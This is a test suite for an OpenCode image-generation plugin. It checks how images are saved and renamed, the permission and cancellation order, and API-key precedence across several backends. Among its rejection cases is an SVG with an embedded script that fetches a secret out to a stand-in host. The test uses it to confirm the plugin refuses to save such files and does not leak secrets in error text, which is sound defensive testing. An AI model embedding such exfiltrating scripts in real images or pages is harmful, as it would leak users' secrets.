import { afterEach, beforeEach, describe, expect, mock, test } from "bun:test"
import { existsSync } from "node:fs"
import { mkdtemp, readdir, readFile, rm } from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import {
  ANIMATED_GIF_BUFFER,
  isolateEnvironment,
  JPEG_BUFFER,
  LOSSLESS_WEBP_BUFFER,
  LOSSY_WEBP_BUFFER,
  PNG_BASE64,
  PNG_BUFFER,
  SVG_BUFFER,
  WEBP_BUFFER,
} from "./fixtures"
import {
  ENVIRONMENT_KEY,
  FLAVOURS,
  type Flavour,
  STORED_CREDENTIALS,
  type ToolHarness,
  v1Harness,
  v2Harness,
} from "./hosts"

// The image flow is shared by both host adapters and every backend, so each test runs against OpenCode 1 and
// OpenCode 2 with each backend selected, once for each tool the backend registers that calls the provider.
// Wire-level request details live in codex.test.ts, openai-api.test.ts and nano-gpt.test.ts.
isolateEnvironment()
const originalFetch = globalThis.fetch
let dir: string

beforeEach(async () => {
  process.env.OPENCODE_AUTH_CONTENT = JSON.stringify(STORED_CREDENTIALS)
  dir = await mkdtemp(path.join(os.tmpdir(), "imagegen-"))
  // The reference image of the calls that edit.
  await Bun.write(path.join(dir, "ref.png"), PNG_BUFFER)
})

afterEach(async () => {
  globalThis.fetch = originalFetch
  await rm(dir, { recursive: true, force: true })
})

function imagesResponse(b64Json: string): Response {
  return new Response(JSON.stringify({ created: 0, data: [{ b64_json: b64Json }] }))
}

function stubFetch(
  respond: (url: string, init: RequestInit) => Response | Promise<Response> = () => imagesResponse(PNG_BASE64),
) {
  const fetchMock = mock(async (url: string, init: RequestInit) => respond(url, init))
  globalThis.fetch = fetchMock as unknown as typeof fetch
  return fetchMock
}

type CreateHarness = (directory: string, flavour: Flavour, tool?: string) => Promise<ToolHarness>
const hosts: Array<[string, CreateHarness]> = [
  ["OpenCode 1", v1Harness],
  ["OpenCode 2", v2Harness],
]
const matrix = hosts.flatMap(([host, create]) =>
  FLAVOURS.flatMap((flavour) =>
    flavour.operations.map((operation) => [host, flavour.backend, operation.tool, create, flavour, operation] as const),
  ),
)

// The files the tests did not put there themselves.
const listed = async () => (await readdir(dir)).filter((name) => name !== "ref.png")

describe.each(matrix)("%s with the %s backend calling %s", (_host, _backend, _tool, create, flavour, operation) => {
  const args = operation.args
  const createHarness = (directory: string) => create(directory, flavour, operation.tool)

  test("saves the generated image under the host directory and reports it", async () => {
    const fetchMock = stubFetch()
    const harness = await createHarness(dir)

    const result = await harness.execute(args)

    const savedPath = path.join(dir, "cat.png")
    expect(await readFile(savedPath)).toEqual(PNG_BUFFER)
    // PNG_BASE64 is a 1x1 image. The message reports the size of the saved image, not the requested size.
    expect(result).toEqual({
      message: `Generated image saved to ${savedPath}. The image is PNG, 1x1 pixels.`,
      out: savedPath,
      versioned: false,
    })
    const [url, init] = fetchMock.mock.calls[0]
    expect(url).toBe(operation.url)
    expect((init.headers as Record<string, string>).Authorization).toBe(flavour.authorization)
  })

  test("versions the output path when it already exists", async () => {
    stubFetch()
    const harness = await createHarness(dir)
    await harness.execute(args)

    const second = await harness.execute(args)

    expect(second.out).toBe(path.join(dir, "cat-v2.png"))
    expect(second.versioned).toBe(true)
    expect(second.message).toContain(`The target path ${path.join(dir, "cat.png")} already existed`)
    expect(await readFile(path.join(dir, "cat.png"))).toEqual(PNG_BUFFER)
  })

  test.each([
    ["PNG", PNG_BUFFER, "png", "1x1"],
    ["JPEG", JPEG_BUFFER, "jpg", "3x2"],
    ["WebP", WEBP_BUFFER, "webp", "3x2"],
    ["WebP", LOSSLESS_WEBP_BUFFER, "webp", "3x2"],
    ["WebP", LOSSY_WEBP_BUFFER, "webp", "3x2"],
  ] as const)("saves native %s bytes with matching extension and dimensions", async (format, bytes, ext, size) => {
    stubFetch(() => imagesResponse(bytes.toString("base64")))
    const harness = await createHarness(dir)

    const result = await harness.execute({ ...args, out: "nested/image" })

    expect(result.out).toBe(path.join(dir, `nested/image.${ext}`))
    expect(await readFile(path.join(dir, `nested/image.${ext}`))).toEqual(bytes)
    expect(result.versioned).toBe(false)
    expect(result.message).toContain(`The image is ${format}, ${size} pixels.`)
    expect(result.message).toContain(`was adjusted to ${result.out} to match the ${format} bytes`)
    expect(result.message).not.toContain("already existed")
  })

  test.each([
    ["image.jpg", PNG_BUFFER, "image.png"],
    ["image.jpeg", WEBP_BUFFER, "image.webp"],
    ["image.PNG", JPEG_BUFFER, "image.jpg"],
    ["image.webp", PNG_BUFFER, "image.png"],
    ["image.JPEG", JPEG_BUFFER, "image.JPEG"],
    ["image.JPG", JPEG_BUFFER, "image.JPG"],
    ["image.PNG", PNG_BUFFER, "image.PNG"],
    ["image.WEBP", WEBP_BUFFER, "image.WEBP"],
    ["image.data", JPEG_BUFFER, "image.data.jpg"],
  ] as const)("adjusts or preserves %s according to the bytes", async (out, bytes, target) => {
    stubFetch(() => imagesResponse(bytes.toString("base64")))
    await Bun.write(path.join(dir, "session/ref.png"), PNG_BUFFER)
    const harness = await createHarness(path.join(dir, "session"))

    const result = await harness.execute({ ...args, out: path.join(dir, out) })

    expect(result.out).toBe(path.join(dir, target))
    expect(result.versioned).toBe(false)
    expect(await readFile(path.join(dir, target))).toEqual(bytes)
    expect(result.message.includes("was adjusted")).toBe(out !== target)
  })

  test("versions the format-adjusted target, distinguishing extension adjustment from collision", async () => {
    stubFetch(() => imagesResponse(JPEG_BUFFER.toString("base64")))
    const harness = await createHarness(dir)
    // The requested path and both earlier JPEG targets belong to existing outputs.
    for (const file of ["cat.png", "cat.jpg", "cat-v2.jpg"]) await Bun.write(path.join(dir, file), PNG_BUFFER)

    const result = await harness.execute(args)

    expect(result.out).toBe(path.join(dir, "cat-v3.jpg"))
    expect(result.versioned).toBe(true)
    expect(await readFile(path.join(dir, "cat-v3.jpg"))).toEqual(JPEG_BUFFER)
    expect(result.message).toContain(`was adjusted to ${path.join(dir, "cat.jpg")} to match the JPEG bytes`)
    expect(result.message).toContain(`The target path ${path.join(dir, "cat.jpg")} already existed`)
    for (const file of ["cat.png", "cat.jpg", "cat-v2.jpg"]) {
      expect(await readFile(path.join(dir, file))).toEqual(PNG_BUFFER)
    }
  })

  test("an existing requested path alone does not cause collision versioning after extension adjustment", async () => {
    stubFetch(() => imagesResponse(WEBP_BUFFER.toString("base64")))
    const harness = await createHarness(dir)
    await Bun.write(path.join(dir, "cat.png"), PNG_BUFFER)

    const result = await harness.execute(args)

    expect(result.out).toBe(path.join(dir, "cat.webp"))
    expect(result.versioned).toBe(false)
    expect(await readFile(path.join(dir, "cat.png"))).toEqual(PNG_BUFFER)
  })

  // Codex and the OpenAI Images API keep their original contract: an argument they do not define is dropped.
  if (flavour.dropsUnknownArguments) {
    test("drops arguments it does not define", async () => {
      const fetchMock = stubFetch()
      const harness = await createHarness(dir)

      await harness.execute({
        ...args,
        n: 4,
        moderation: "low",
        ...(flavour.savesGifAndSvg ? {} : { output_format: "jpeg" }),
      })

      const body = JSON.parse(fetchMock.mock.calls[0][1].body as string)
      expect(body.n).not.toBe(4)
      expect(body).not.toHaveProperty("moderation")
      if (!flavour.savesGifAndSvg) expect(body).not.toHaveProperty("output_format")
    })
  }

  // The OpenAI Images API also saves GIF and SVG; the other backends refuse both like any other unsupported type.
  if (flavour.savesGifAndSvg) {
    test.each([
      [
        "GIF",
        { output_format: "gif", frame_count: 4, frame_duration_ms: 150 },
        { output_format: "gif", frame_count: 4, frame_duration_ms: 150 },
        ANIMATED_GIF_BUFFER,
        "gif",
        "GIF, 3x2 pixels (the header's logical screen size; frames and animation are not checked)",
      ],
      [
        "SVG",
        { output_format: "svg", svg_model: "author-model" },
        { output_format: "svg", svg: { model: "author-model" } },
        SVG_BUFFER,
        "svg",
        "SVG, a vector document with viewBox 0 0 24 12, width 240 and height 120 (vector units, not pixels)",
      ],
    ] as const)(
      "requests %s output and saves the native bytes with a matching extension",
      async (format, requested, sent, bytes, ext, description) => {
        const fetchMock = stubFetch(() => imagesResponse(bytes.toString("base64")))
        const harness = await createHarness(dir)

        const result = await harness.execute({ ...args, ...requested, out: "nested/image" })

        // The host carries the format controls into the request; openai-api.test.ts owns the exact body.
        expect(JSON.parse(fetchMock.mock.calls[0][1].body as string)).toMatchObject(sent)
        expect(result.out).toBe(path.join(dir, `nested/image.${ext}`))
        expect(await readFile(path.join(dir, `nested/image.${ext}`))).toEqual(bytes)
        expect(result.versioned).toBe(false)
        expect(result.message).toContain(`The image is ${description}.`)
        expect(result.message).toContain(`was adjusted to ${result.out} to match the ${format} bytes`)
      },
    )

    test.each([
      ["image.png", SVG_BUFFER, "image.svg"],
      ["image.svg", PNG_BUFFER, "image.png"],
      ["image.gif", JPEG_BUFFER, "image.jpg"],
      ["image.webp", ANIMATED_GIF_BUFFER, "image.gif"],
      ["image.SVG", SVG_BUFFER, "image.SVG"],
      ["image.GIF", ANIMATED_GIF_BUFFER, "image.GIF"],
      ["image.vector", SVG_BUFFER, "image.vector.svg"],
    ] as const)("adjusts or preserves %s according to the GIF or SVG bytes", async (out, bytes, target) => {
      stubFetch(() => imagesResponse(bytes.toString("base64")))
      const harness = await createHarness(dir)

      const result = await harness.execute({ ...args, out })

      expect(result.out).toBe(path.join(dir, target))
      expect(result.versioned).toBe(false)
      expect(await readFile(path.join(dir, target))).toEqual(bytes)
    })
  }

  test("treats optional arguments that are null as omitted", async () => {
    const fetchMock = stubFetch()
    const harness = await createHarness(dir)
    // Some models fill unused optional arguments with null.
    await harness.execute({ ...args, ...operation.nulls })

    expect(fetchMock.mock.calls[0][0]).toBe(operation.url)
    const body = JSON.parse(fetchMock.mock.calls[0][1].body as string)
    expect(body).toMatchObject(operation.nullBody)
    for (const field of operation.absentWhenNull) expect(body).not.toHaveProperty(field)
  })

  test.each(operation.invalid)(
    "rejects %s before asking permission or calling the backend",
    async (_name, invalid, message) => {
      const fetchMock = stubFetch()
      const harness = await createHarness(dir)

      await expect(harness.execute(invalid)).rejects.toThrow(message)

      expect(harness.permissionRequests).toHaveLength(0)
      expect(fetchMock).not.toHaveBeenCalled()
    },
  )

  test("asks permission once for the whole operation before calling the backend", async () => {
    const harness = await createHarness(dir)
    const fetchMock = stubFetch(() => {
      expect(harness.permissionRequests).toHaveLength(1)
      return imagesResponse(PNG_BASE64)
    })

    await harness.execute(args)

    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect(harness.permissionRequests).toHaveLength(1)
  })

  test("a denied permission stops before credentials, reference images or the backend are touched", async () => {
    // Reaching the credential store or the key variable would fail with a different error than the denial.
    process.env.OPENCODE_AUTH_CONTENT = "{}"
    process.env.OC_MULTI_IMAGEGEN_OPENAI_API_KEY = ""
    const fetchMock = stubFetch()
    const harness = await createHarness(dir)
    harness.denyPermission(new Error("denied by the host"))

    // The reference image does not exist: reading it first would fail with a different error. A tool that takes no
    // references has none to read.
    const act = harness.execute(operation.tool === flavour.editTool ? { ...args, images: ["missing.png"] } : args)

    await expect(act).rejects.toThrow("denied by the host")
    expect(fetchMock).not.toHaveBeenCalled()
    expect(existsSync(path.join(dir, "cat.png"))).toBe(false)
  })

  test("forwards the cancellation signal to the provider request", async () => {
    const fetchMock = stubFetch()
    const harness = await createHarness(dir)
    const controller = new AbortController()

    await harness.execute(args, controller.signal)

    expect(fetchMock.mock.calls[0][1].signal).toBe(controller.signal)
  })

  test("does nothing when the call is cancelled before it starts", async () => {
    const fetchMock = stubFetch()
    const harness = await createHarness(dir)
    const controller = new AbortController()
    controller.abort(new Error("stopped before start"))

    const act = harness.execute(args, controller.signal)

    await expect(act).rejects.toThrow("stopped before start")
    expect(harness.permissionRequests).toHaveLength(0)
    expect(fetchMock).not.toHaveBeenCalled()
  })

  test("cancelling during the provider request rejects without retrying or saving", async () => {
    const controller = new AbortController()
    const fetchMock = stubFetch(
      (_url, init) =>
        new Promise<Response>((_resolve, reject) => {
          init.signal?.addEventListener("abort", () => reject(init.signal?.reason))
          controller.abort(new Error("stopped during request"))
        }),
    )
    const harness = await createHarness(dir)

    const act = harness.execute(args, controller.signal)

    await expect(act).rejects.toThrow("stopped during request")
    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect(await listed()).toEqual([])
  })

  test("does not save an image whose request finished after cancellation", async () => {
    const controller = new AbortController()
    const fetchMock = stubFetch(() => {
      controller.abort(new Error("stopped after response"))
      return imagesResponse(PNG_BASE64)
    })
    const harness = await createHarness(dir)

    const act = harness.execute(args, controller.signal)

    await expect(act).rejects.toThrow("stopped after response")
    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect(await listed()).toEqual([])
  })

  test("propagates a provider failure once, without saving or trying another backend", async () => {
    const fetchMock = stubFetch(() => new Response("upstream boom", { status: 500 }))
    const harness = await createHarness(dir)

    const act = harness.execute(args)

    await expect(act).rejects.toThrow(operation.failure)
    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect(await listed()).toEqual([])
  })

  const zeroWidthPng = Buffer.from(PNG_BUFFER)
  zeroWidthPng.writeUInt32BE(0, 16)
  const rasterOnly: Array<[string, Buffer, string]> = flavour.savesGifAndSvg
    ? []
    : [
        ["GIF", ANIMATED_GIF_BUFFER, "unsupported image type (image/gif)"],
        [
          "SVG",
          Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"/>'),
          "unsupported image type (unknown)",
        ],
        ["SVG with an XML declaration", SVG_BUFFER, "unsupported image type (application/xml)"],
      ]
  const zeroWidthGif = Buffer.from(ANIMATED_GIF_BUFFER)
  zeroWidthGif.writeUInt16LE(0, 6)
  // One SVG for each way inspectSvg refuses (a refused form, a parser error, the root geometry); output-image.test.ts
  // covers the reasons themselves.
  const refusedSvg = (reason: string) => `the backend returned an SVG this plugin will not save: ${reason}`
  const svgBytes = (markup: string) => Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg"${markup}</svg>`)
  const gifAndSvg: Array<[string, Buffer, string]> = flavour.savesGifAndSvg
    ? [
        ["truncated GIF", ANIMATED_GIF_BUFFER.subarray(0, 8), "malformed image/gif"],
        ["zero GIF width", zeroWidthGif, "malformed image/gif"],
        [
          "an SVG with a script",
          svgBytes(' viewBox="0 0 1 1"><script>fetch("https://secret.example/?sig=SECRET")</script>'),
          refusedSvg("it contains a <script> element"),
        ],
        [
          "malformed SVG markup",
          svgBytes(' viewBox="0 0 1 1"><g secret="SECRET">'),
          refusedSvg("it is not well-formed XML"),
        ],
        [
          "an SVG without a size",
          svgBytes('><rect width="1" height="1"/>'),
          refusedSvg("its root has neither a viewBox nor a positive width and height"),
        ],
      ]
    : []
  test.each([
    ["unknown bytes", Buffer.from("https://secret.example/?sig=SECRET sk-secret"), "unsupported image type (unknown)"],
    ...rasterOnly,
    ...gifAndSvg,
    ["truncated PNG", PNG_BUFFER.subarray(0, 16), "malformed image/png"],
    ["truncated JPEG", JPEG_BUFFER.subarray(0, 20), "malformed image/jpeg"],
    ["truncated VP8X WebP", WEBP_BUFFER.subarray(0, 16), "malformed image/webp"],
    ["truncated VP8 WebP", LOSSY_WEBP_BUFFER.subarray(0, 29), "malformed image/webp"],
    ["truncated VP8X dimensions", WEBP_BUFFER.subarray(0, 29), "malformed image/webp"],
    ["truncated VP8L WebP", Buffer.from("5249464608000000574542505650384c", "hex"), "malformed image/webp"],
    ["truncated VP8L dimensions", LOSSLESS_WEBP_BUFFER.subarray(0, 24), "malformed image/webp"],
    ["zero PNG width", zeroWidthPng, "malformed image/png"],
  ])("saves nothing, not even the output directory, for %s", async (_name, bytes, diagnostic) => {
    const fetchMock = stubFetch(() => imagesResponse(bytes.toString("base64")))
    const harness = await createHarness(dir)

    const error = (await harness.execute({ ...args, out: "nested/cat.png" }).catch((caught: Error) => caught)) as Error

    expect(error).toBeInstanceOf(Error)
    expect(error.message).toContain(diagnostic)
    expect(error.message.length).toBeLessThan(400)
    expect(error.message).not.toMatch(/secret|SECRET|https:/)
    if (flavour.backend === "nano-gpt") {
      expect(error.message).toContain("The image was not saved. NanoGPT may already have charged for this generation.")
    }
    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect(await listed()).toEqual([])
  })

  // Buffer.from decodes an array or a serialized Buffer, so the PNG bytes below would pass the format check if the
  // response boundary accepted them. An empty image would otherwise write a 0-byte file.
  const malformedResponses: Array<[string, unknown]> = [
    ["no image", { data: [] }],
    ["an empty image", { data: [{ b64_json: "" }] }],
    ["a null body", null],
    ["a numeric array of PNG bytes", { data: [{ b64_json: [...PNG_BUFFER] }] }],
    ["a serialized Buffer of PNG bytes", { data: [{ b64_json: { type: "Buffer", data: [...PNG_BUFFER] } }] }],
  ]
  test.each(malformedResponses)(
    "rejects %s from the backend after one request, saving nothing, not even the output directory",
    async (_name, body) => {
      const fetchMock = stubFetch(() => new Response(JSON.stringify(body)))
      const harness = await createHarness(dir)

      const act = harness.execute({ ...args, out: "nested/cat.png" })

      await expect(act).rejects.toThrow(operation.unusableResponse)
      expect(fetchMock).toHaveBeenCalledTimes(1)
      expect(await listed()).toEqual([])
    },
  )
})

// The reference images of a call that edits, as the host adapters read them from the project directory.
const flavourRows = hosts.flatMap(([host, create]) =>
  FLAVOURS.map((flavour) => [host, flavour.backend, create, flavour] as const),
)

describe.each(flavourRows)("reference images through %s with the %s backend", (_host, _backend, create, flavour) => {
  test.each([
    ["JPEG", JPEG_BUFFER, "image/jpeg"],
    ["WebP", WEBP_BUFFER, "image/webp"],
  ] as const)("chains the returned %s output path into the next edit", async (_format, bytes, mime) => {
    const fetchMock = stubFetch(() => imagesResponse(bytes.toString("base64")))
    const generator = await create(dir, flavour, flavour.operations[0].tool)
    const editor = await create(dir, flavour, flavour.editTool)
    const generated = await generator.execute(flavour.operations[0].args)
    if (typeof generated.out !== "string") throw new Error("the image tool returned no saved path")

    await editor.execute({ ...flavour.editArgs([generated.out]), out: "edit.png" })

    const body = JSON.parse(fetchMock.mock.calls[1][1].body as string)
    expect(flavour.editReferences(body)).toEqual([`data:${mime};base64,${bytes.toString("base64")}`])
    expect(fetchMock).toHaveBeenCalledTimes(2)
  })

  test("are sent to the editing endpoint in the order given", async () => {
    const fetchMock = stubFetch()
    const second = Buffer.concat([PNG_BUFFER, Buffer.from("trailer")])
    await Bun.write(path.join(dir, "first.png"), PNG_BUFFER)
    await Bun.write(path.join(dir, "second.png"), second)
    const harness = await create(dir, flavour, flavour.editTool)

    await harness.execute(flavour.editArgs(["first.png", "second.png"]))

    expect(fetchMock.mock.calls[0][0]).toBe(flavour.editsUrl)
    const body = JSON.parse(fetchMock.mock.calls[0][1].body as string)
    expect(flavour.editReferences(body)).toEqual([
      `data:image/png;base64,${PNG_BASE64}`,
      `data:image/png;base64,${second.toString("base64")}`,
    ])
  })
})

const keyFlavours = FLAVOURS.filter((flavour) => flavour.key)
const keyRows = hosts.flatMap(([host, create]) =>
  keyFlavours.map((flavour) => [host, flavour.backend, create, flavour] as const),
)
const codexFlavour = FLAVOURS.find((flavour) => flavour.backend === "codex") as Flavour

// The saved key of each backend is in each host's own store (STORED_CREDENTIALS, and the OpenCode 2 fake connection
// store). OpenCode lists a saved credential before an environment variable, so these tests also show the plugin does
// not take the saved key when the variable is present.
describe.each(keyRows)("API key source through %s with the %s backend", (_host, _backend, create, flavour) => {
  const { variable, saved } = flavour.key as NonNullable<Flavour["key"]>
  const args = flavour.operations[0].args
  const authorizations = (fetchMock: ReturnType<typeof stubFetch>) =>
    fetchMock.mock.calls.map(([, init]) => (init.headers as Record<string, string>).Authorization)

  test(`uses ${variable} ahead of the saved key, and the next call after it changes`, async () => {
    const fetchMock = stubFetch()
    const harness = await create(dir, flavour)

    process.env[variable] = ENVIRONMENT_KEY
    await harness.execute(args)
    process.env[variable] = "sk-rotated"
    await harness.execute({ ...args, out: "second.png" })
    delete process.env[variable]
    await harness.execute({ ...args, out: "third.png" })

    expect(authorizations(fetchMock)).toEqual([`Bearer ${ENVIRONMENT_KEY}`, "Bearer sk-rotated", `Bearer ${saved}`])
  })

  test.each([
    ["is empty", "", "is set but empty"],
    ["cannot be an HTTP header value", "sk bad\nkey", "contains characters that cannot be sent in an HTTP header"],
  ])("fails when the variable %s, without using the saved key or sending a request", async (_name, value, message) => {
    const fetchMock = stubFetch()
    const harness = await create(dir, flavour)
    process.env[variable] = value

    const error = await harness.execute(args).catch((caught: Error) => caught)

    expect(error).toBeInstanceOf(Error)
    expect((error as Error).message).toContain(message)
    expect((error as Error).message).not.toContain("sk bad")
    expect(fetchMock).not.toHaveBeenCalled()
  })

  test("a rejected request is reported once, without a second request with the saved key", async () => {
    const fetchMock = stubFetch(() => new Response("denied", { status: 401 }))
    const harness = await create(dir, flavour)
    process.env[variable] = ENVIRONMENT_KEY

    await expect(harness.execute(args)).rejects.toThrow("401")

    expect(authorizations(fetchMock)).toEqual([`Bearer ${ENVIRONMENT_KEY}`])
  })

  test("ignores the variable of every other backend", async () => {
    const fetchMock = stubFetch()
    const harness = await create(dir, flavour)
    for (const other of keyFlavours) {
      if (other !== flavour) process.env[(other.key as NonNullable<Flavour["key"]>).variable] = ENVIRONMENT_KEY
    }

    await harness.execute(args)

    expect(authorizations(fetchMock)).toEqual([`Bearer ${saved}`])
  })
})

describe.each(hosts)("the Codex backend through %s", (_host, create) => {
  test("ignores every image API key variable and keeps its ChatGPT sign-in", async () => {
    const fetchMock = stubFetch()
    const harness = await create(dir, codexFlavour)
    for (const flavour of keyFlavours)
      process.env[(flavour.key as NonNullable<Flavour["key"]>).variable] = ENVIRONMENT_KEY

    await harness.execute(codexFlavour.operations[0].args)

    expect(fetchMock.mock.calls[0][0]).toBe(codexFlavour.operations[0].url)
    expect(fetchMock.mock.calls.map(([, init]) => (init.headers as Record<string, string>).Authorization)).toEqual([
      codexFlavour.authorization,
    ])
  })
})

describe.each(flavourRows)("backend choice through %s with the %s backend", (_host, _backend, create, flavour) => {
  test("stays the backend the plugin loaded with when the variable changes later", async () => {
    const fetchMock = stubFetch()
    const harness = await create(dir, flavour)
    process.env.OC_MULTI_IMAGEGEN_BACKEND = flavour.backend === "codex" ? "openai-api" : "codex"

    await harness.execute(flavour.operations[0].args)

    expect(fetchMock.mock.calls[0][0]).toBe(flavour.operations[0].url)
  })
})

// The OpenAI Images API's imagegen_models asks OpenAI for the key's model list. It shares the image flow's order
// (validation, cancellation, permission, credential) but needs no session directory and touches no file. The exact
// request and the answer's wording are covered in openai-api.test.ts.
const openaiFlavour = FLAVOURS.find((flavour) => flavour.backend === "openai-api") as Flavour
const modelList = {
  object: "list",
  data: [{ id: "gpt-image-2.6-sunburst", object: "model", created: 1, owned_by: "system" }],
}

describe.each(hosts)("the OpenAI model lookup through %s", (_host, create) => {
  const lookup = () => create(dir, openaiFlavour, "imagegen_models")

  test("asks permission once, then sends one GET with the image key and returns text, writing nothing", async () => {
    const harness = await lookup()
    const fetchMock = stubFetch(() => {
      expect(harness.permissionRequests).toHaveLength(1)
      return new Response(JSON.stringify(modelList))
    })

    const result = await harness.execute({})

    expect(result.message).toContain("- gpt-image-2.6-sunburst (imagegen default)")
    expect(result.out).toBeUndefined()
    expect(fetchMock).toHaveBeenCalledTimes(1)
    const [url, init] = fetchMock.mock.calls[0]
    expect(url).toBe("https://api.openai.com/v1/models")
    expect(init.method).toBe("GET")
    expect((init.headers as Record<string, string>).Authorization).toBe("Bearer sk-images")
    expect(await listed()).toEqual([])
  })

  test("uses the environment key ahead of the saved one", async () => {
    const fetchMock = stubFetch(() => new Response(JSON.stringify(modelList)))
    const harness = await lookup()
    process.env.OC_MULTI_IMAGEGEN_OPENAI_API_KEY = ENVIRONMENT_KEY

    await harness.execute({})

    const headers = fetchMock.mock.calls[0][1].headers as Record<string, string>
    expect(headers.Authorization).toBe(`Bearer ${ENVIRONMENT_KEY}`)
  })

  test.each([
    ["model with query", { model: "gpt-image-2.6-sunburst", query: "image" }, "model cannot be combined with query"],
    ["an unknown argument", { limit: 5 }, "limit"],
    ["an empty query", { query: "" }, "at query"],
  ])("rejects %s before asking permission or calling OpenAI", async (_name, invalid, message) => {
    const fetchMock = stubFetch()
    const harness = await lookup()

    await expect(harness.execute(invalid)).rejects.toThrow(message)

    expect(harness.permissionRequests).toHaveLength(0)
    expect(fetchMock).not.toHaveBeenCalled()
  })

  test("a denied permission stops before the credential or the network is touched", async () => {
    // Reaching the credential store or the key variable would fail with a different error than the denial.
    process.env.OPENCODE_AUTH_CONTENT = "{}"
    process.env.OC_MULTI_IMAGEGEN_OPENAI_API_KEY = ""
    const fetchMock = stubFetch()
    const harness = await lookup()
    harness.denyPermission(new Error("denied by the host"))

    await expect(harness.execute({})).rejects.toThrow("denied by the host")

    expect(fetchMock).not.toHaveBeenCalled()
  })

  test("does nothing when the call is cancelled before it starts", async () => {
    const fetchMock = stubFetch()
    const harness = await lookup()
    const controller = new AbortController()
    controller.abort(new Error("stopped before start"))

    await expect(harness.execute({}, controller.signal)).rejects.toThrow("stopped before start")

    expect(harness.permissionRequests).toHaveLength(0)
    expect(fetchMock).not.toHaveBeenCalled()
  })

  test("cancelling during the request rejects with the reason, without retrying", async () => {
    const controller = new AbortController()
    const fetchMock = stubFetch(
      (_url, init) =>
        new Promise<Response>((_resolve, reject) => {
          init.signal?.addEventListener("abort", () => reject(init.signal?.reason))
          controller.abort(new Error("stopped during request"))
        }),
    )
    const harness = await lookup()

    await expect(harness.execute({}, controller.signal)).rejects.toThrow("stopped during request")

    expect(fetchMock).toHaveBeenCalledTimes(1)
    expect(fetchMock.mock.calls[0][1].signal).toBe(controller.signal)
  })

  test("does not answer when the list arrived after cancellation", async () => {
    const controller = new AbortController()
    stubFetch(() => {
      controller.abort(new Error("stopped after response"))
      return new Response(JSON.stringify(modelList))
    })
    const harness = await lookup()

    await expect(harness.execute({}, controller.signal)).rejects.toThrow("stopped after response")
  })

  test("propagates a rejected request once, with the key removed", async () => {
    process.env.OC_MULTI_IMAGEGEN_OPENAI_API_KEY = ENVIRONMENT_KEY
    const fetchMock = stubFetch(() => new Response(`{"error":"bad key ${ENVIRONMENT_KEY}"}`, { status: 401 }))
    const harness = await lookup()

    const error = (await harness.execute({}).catch((caught: Error) => caught)) as Error

    expect(error.message).toBe('openai-api models request failed: 401 {"error":"bad key [redacted]"}')
    expect(fetchMock).toHaveBeenCalledTimes(1)
  })
})
